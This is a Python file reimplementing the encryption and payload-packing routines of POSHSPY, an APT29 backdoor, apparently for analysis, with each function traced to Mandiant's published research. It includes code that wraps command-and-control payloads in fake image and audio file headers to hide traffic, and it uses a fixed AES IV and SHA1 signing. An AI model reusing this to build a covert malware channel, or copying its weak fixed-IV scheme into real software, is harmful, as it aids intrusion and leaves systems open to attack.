# poshspy/crypto.py
# POSHSPY cryptographic implementation
# Source: Mandiant — Dissecting One of APT29's Fileless WMI and PowerShell Backdoors (2017)
# Original sample: matthewdunwoody/POSHSPY (GitHub)
# Every function directly attributed to source

import os
import random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA1
from Crypto.Util.Padding import pad, unpad

# Fixed IV from POSHSPY source — VC.defaultIV
DEFAULT_IV = bytes([0xae, 0x2f, 0x2d, 0x23, 0xec, 0x15, 0x76, 0x5c,
                    0xa6, 0x2c, 0x45, 0xef, 0xe3, 0x5b, 0x1e, 0x72])

# File signatures from VP.CreateFS()
FILE_SIGNATURES = {
    'ico': bytes([0x00, 0x00, 0x01, 0x00]),
    'gif': bytes([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]),
    'jpg': bytes([0xFF, 0xD8, 0xFF]),
    'png': bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]),
    'mp3': bytes([0x49, 0x44, 0x33]),
    'bmp': bytes([0x42, 0x4D])
}
SIG_LEN = 12  # sigLen = 12 in VP class

def encrypt_aes(data: bytes, key: bytes) -> bytes:
    """AES encrypt with fixed IV. Source: VC.EncryptDataAes()"""
    cipher = AES.new(key, AES.MODE_CBC, DEFAULT_IV)
    return cipher.encrypt(pad(data, AES.block_size))

def decrypt_aes(data: bytes, key: bytes) -> bytes:
    """AES decrypt with fixed IV. Source: VC.DecryptDataAes()"""
    cipher = AES.new(key, AES.MODE_CBC, DEFAULT_IV)
    return unpad(cipher.decrypt(data), AES.block_size)

def encrypt_rsa(data: bytes, pub_key: RSA.RsaKey) -> bytes:
    """RSA PKCS1v1.5 encrypt. Source: VC.EncryptDataRsa(), rsaKeyPKCSpadding=false"""
    cipher = PKCS1_v1_5.new(pub_key)
    return cipher.encrypt(data)

def decrypt_rsa(data: bytes, priv_key: RSA.RsaKey) -> bytes:
    """RSA PKCS1v1.5 decrypt. Source: VC.DecryptDataRsa()"""
    cipher = PKCS1_v1_5.new(priv_key)
    return cipher.decrypt(data, None)

def sign_rsa(data: bytes, priv_key: RSA.RsaKey) -> bytes:
    """RSA SHA1 sign. Source: VC.HashAndSignDataRsa()"""
    h = SHA1.new(data)
    return pkcs1_15.new(priv_key).sign(h)

def verify_rsa(data: bytes, signature: bytes, pub_key: RSA.RsaKey) -> bool:
    """RSA SHA1 verify. Source: VC.VerifySignedData()"""
    h = SHA1.new(data)
    try:
        pkcs1_15.new(pub_key).verify(h, signature)
        return True
    except (ValueError, TypeError):
        return False

def encrypt_pki(data: bytes, receiver_pub: RSA.RsaKey, sender_priv: RSA.RsaKey) -> bytes:
    """Full PKI encrypt. Source: VC.EncryptDataPki()
    Output: [128B signature][128B RSA-enc AES key][AES-enc data]
    """
    aes_key = os.urandom(32)  # GenerateKey()
    aes_enc_data = encrypt_aes(data, aes_key)
    rsa_enc_aes_key = encrypt_rsa(aes_key, receiver_pub)
    data_to_sign = rsa_enc_aes_key + aes_enc_data
    signature = sign_rsa(data_to_sign, sender_priv)
    return signature + data_to_sign

def decrypt_pki(data: bytes, sender_pub: RSA.RsaKey, receiver_priv: RSA.RsaKey) -> bytes:
    """Full PKI decrypt. Source: VC.DecryptDataPki()"""
    if len(data) <= 256:
        return None
    signature = data[:128]
    signed_data = data[128:]
    if not verify_rsa(signed_data, signature, sender_pub):
        return None
    enc_aes_key = signed_data[:128]
    enc_data = signed_data[128:]
    aes_key = decrypt_rsa(enc_aes_key, receiver_priv)
    return decrypt_aes(enc_data, aes_key)

def add_file_signature(data: bytes) -> tuple[bytes, str]:
    """Prepend random file signature. Source: VP.AddFS() / VP.CreateFS()"""
    ext = random.choice(list(FILE_SIGNATURES.keys()))
    magic = FILE_SIGNATURES[ext]
    sig = bytearray(SIG_LEN)
    random_bytes = os.urandom(SIG_LEN)
    sig[:len(magic)] = magic
    sig[len(magic):] = random_bytes[len(magic):]
    return bytes(sig) + data, ext

def remove_file_signature(data: bytes) -> bytes:
    """Strip file signature. Source: VP.RemoveFS()"""
    return data[SIG_LEN:]

def pack_payload(payload_type: int, data: bytes, 
                 sender_priv: RSA.RsaKey, receiver_pub: RSA.RsaKey) -> tuple[bytes, str]:
    """Pack typed payload. Source: VP.PD()"""
    package = bytes([payload_type]) + data
    encrypted = encrypt_pki(package, receiver_pub, sender_priv)
    return add_file_signature(encrypted)

def unpack_payload(data: bytes,
                   sender_pub: RSA.RsaKey, receiver_priv: RSA.RsaKey) -> tuple[int, bytes]:
    """Unpack typed payload. Source: VP.ED()"""
    raw = remove_file_signature(data)
    clear = decrypt_pki(raw, sender_pub, receiver_priv)
    return clear[0], clear[1:]